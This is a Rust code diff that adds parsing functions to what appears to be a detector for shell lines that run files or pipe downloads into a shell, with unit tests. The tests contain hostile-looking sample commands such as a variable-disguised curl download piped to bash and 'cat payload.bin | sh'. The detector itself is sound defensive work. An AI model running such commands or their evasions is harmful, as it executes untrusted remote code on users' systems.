@@ -624,6 +624,179 @@ pub fn runs_file(line: &str, file: &str) -> bool {
     })
 }
 
+/// The files `line` runs or reads in as code, as written: what it gives a
+/// shell or an interpreter (`sh x`, `. ./x`, `python3 x.py`, `sh <x`),
+/// what it runs by its path (`./x`, `/opt/x`), and what it pipes into a
+/// shell (`cat x | sh`).
+pub fn run_targets(line: &str) -> Vec<String> {
+    let mut found: Vec<String> = Vec::new();
+    let mut add = |word: &str| {
+        if let Some(name) = as_file(word.trim_start_matches('<'))
+            && !name.starts_with('-')
+            && !found.contains(&name)
+        {
+            found.push(name);
+        }
+    };
+    let flat = line.replace("&&", ";").replace("||", ";");
+    for (index, statement) in flat.split(';').enumerate() {
+        if index >= MAX_STATEMENTS {
+            break;
+        }
+        let segments: Vec<&str> = statement.split('|').take(MAX_SEGMENTS).collect();
+        // Whether a shell reads what comes after each segment, worked out
+        // once from the end.
+        let mut shell_after = vec![false; segments.len() + 1];
+        for at in (0..segments.len()).rev() {
+            let is_shell = shell_words(segments[at])
+                .first()
+                .map(|word| unquoted(word))
+                .is_some_and(|word| {
+                    matches!(program_name(&word), "sh" | "bash" | "zsh" | "dash" | "ksh")
+                });
+            shell_after[at] = shell_after[at + 1] || is_shell;
+        }
+        for (at, segment) in segments.iter().enumerate() {
+            let words: Vec<String> = shell_words(segment)
+                .iter()
+                .map(|word| unquoted(word))
+                .collect();
+            let mut words = words.iter().map(String::as_str).skip_while(|word| {
+                matches!(
+                    *word,
+                    "sudo"
+                        | "doas"
+                        | "run0"
+                        | "env"
+                        | "command"
+                        | "exec"
+                        | "then"
+                        | "do"
+                        | "else"
+                        | "!"
+                        | "nohup"
+                        | "nice"
+                        | "setsid"
+                        | "time"
+                ) || word.starts_with('-')
+                    || (word.contains('=') && !word.starts_with(['/', '.', '$']))
+            });
+            let Some(program) = words.next() else {
+                continue;
+            };
+            if program.contains('/') {
+                add(program);
+            }
+            let arguments: Vec<&str> = words.collect();
+            // `cat x | sh`: what is read into a shell after it.
+            let piped_into_shell = shell_after[at + 1];
+            if program_name(program) == "cat" && piped_into_shell {
+                for argument in &arguments {
+                    if !argument.starts_with('-') {
+                        add(argument);
+                    }
+                }
+                continue;
+            }
+            let name = program_name(program);
+            let unversioned = name
+                .trim_end_matches(|character: char| character.is_ascii_digit() || character == '.');
+            if !(RUNNERS.contains(&name)
+                || (!unversioned.is_empty() && RUNNERS.contains(&unversioned)))
+            {
+                continue;
+            }
+            // Code given on the command line, or only checked: no file.
+            let options: Vec<&&str> = arguments
+                .iter()
+                .take_while(|word| word.starts_with('-'))
+                .collect();
+            let shell = matches!(unversioned, "sh" | "bash" | "zsh" | "dash" | "ksh");
+            if options.iter().any(|option| {
+                matches!(**option, "-c" | "-n" | "-m" | "--check")
+                    || (**option == "-e" && !shell)
+                    || (shell
+                        && option.len() > 2
+                        && !option.starts_with("--")
+                        && option.ends_with('c'))
+            }) {
+                continue;
+            }
+            if let Some(first) = arguments.iter().find(|word| !word.starts_with('-')) {
+                add(first);
+            }
+        }
+    }
+    found
+}
+
+/// Variables a file sets to a fetcher or a shell (`F=curl`, `S="bash"`),
+/// lowercased, so `$F … | $S` is judged as what it runs.
+pub fn command_variables(text: &str) -> Vec<(String, String)> {
+    let mut found: Vec<(String, String)> = Vec::new();
+    for line in text.lines() {
+        let line = line.trim().strip_prefix("export ").unwrap_or(line.trim());
+        let Some((name, value)) = line.split_once('=') else {
+            continue;
+        };
+        let value = value.trim_matches(['"', '\'']);
+        let is_name = !name.is_empty()
+            && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
+            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
+        let program = program_name(value);
+        if is_name
+            && !value.contains(char::is_whitespace)
+            && (FETCHERS.contains(&program) || matches!(program, "sh" | "bash" | "zsh" | "dash"))
+        {
+            let name = name.to_ascii_lowercase();
+            found.retain(|(known, _)| *known != name);
+            found.push((name, program.to_string()));
+            if found.len() > MAX_COMMAND_VARIABLES {
+                found.remove(0);
+            }
+        }
+    }
+    found
+}
+
+/// The most such variables one file keeps.
+const MAX_COMMAND_VARIABLES: usize = 32;
+
+/// `code` (lowercased) with `$name` and `${name}` of `variables` written
+/// out.
+pub fn with_variables(code: &str, variables: &[(String, String)]) -> String {
+    if variables.is_empty() || !code.contains('$') {
+        return code.to_string();
+    }
+    let mut out = code.to_string();
+    for (name, value) in variables {
+        out = out.replace(&format!("${{{name}}}"), value);
+        // `$name` only where the name ends there.
+        let pattern = format!("${name}");
+        let mut result = String::with_capacity(out.len());
+        let mut rest = out.as_str();
+        while let Some(at) = rest.find(&pattern) {
+            let after = &rest[at + pattern.len()..];
+            result.push_str(&rest[..at]);
+            if after.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') {
+                result.push_str(&pattern);
+            } else {
+                result.push_str(value);
+            }
+            rest = after;
+        }
+        result.push_str(rest);
+        out = result;
+    }
+    out
+}
+
+/// The most pipeline parts of one statement looked at.
+const MAX_SEGMENTS: usize = 64;
+
+/// The most statements of one line looked at for what they run.
+const MAX_STATEMENTS: usize = 64;
+
 /// A shell reading a fetch through process substitution (`sh <(curl …)`,
 /// `source <(curl …)`) or running a command substitution of one
 /// (`bash -c "$(curl …)"`, `eval "$(curl …)"`).
@@ -1383,6 +1556,55 @@ mod tests {
         assert!(!is_download_piped_to_shell(
             "curl https://example.test/data | shellcheck -"
         ));
+    }
+
+    #[test]
+    fn a_fetcher_or_shell_in_a_variable_is_what_runs() {
+        use super::{command_variables, is_download_piped_to_shell, with_variables};
+        let variables = command_variables("F=curl\nexport S=\"/bin/bash\"\nX=hello world\n");
+        assert_eq!(
+            variables,
+            [
+                ("f".to_string(), "curl".to_string()),
+                ("s".to_string(), "bash".to_string())
+            ]
+        );
+        let line = with_variables("$f -fssl https://x.example/i | ${s}", &variables);
+        assert!(is_download_piped_to_shell(&line), "{line}");
+        assert_eq!(with_variables("$fx $s_y", &variables), "$fx $s_y");
+    }
+
+    #[test]
+    fn what_a_line_runs_is_named() {
+        use super::run_targets;
+        for (line, expected) in [
+            ("sh ./install.sh --yes", &["install.sh"][..]),
+            (". ./lib/common", &["lib/common"]),
+            (
+                "python3.12 tools/gen.py && ./build/run",
+                &["tools/gen.py", "build/run"],
+            ),
+            ("cat payload.bin | sh", &["payload.bin"]),
+            ("sh <data/x.png", &["data/x.png"]),
+            ("FOO=1 bash -e scripts/x.sh", &["scripts/x.sh"]),
+        ] {
+            assert_eq!(run_targets(line), expected, "{line}");
+        }
+        // Many pipes cost one pass.
+        let long = "a|".repeat(200_000);
+        let started = std::time::Instant::now();
+        assert!(run_targets(&long).is_empty());
+        assert!(started.elapsed().as_secs() < 10);
+        assert_eq!(run_targets("nohup sh ./x.sh &"), ["x.sh"]);
+        for line in [
+            "sh -c 'echo hi'",
+            "bash -n x.sh",
+            "python -m pip install x",
+            "cat notes.txt",
+            "echo sh x",
+        ] {
+            assert!(run_targets(line).is_empty(), "{line}");
+        }
     }
 
     #[test]
